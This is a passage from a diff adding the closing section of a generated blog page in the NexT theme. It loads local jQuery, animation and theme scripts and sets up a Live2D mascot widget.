+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+
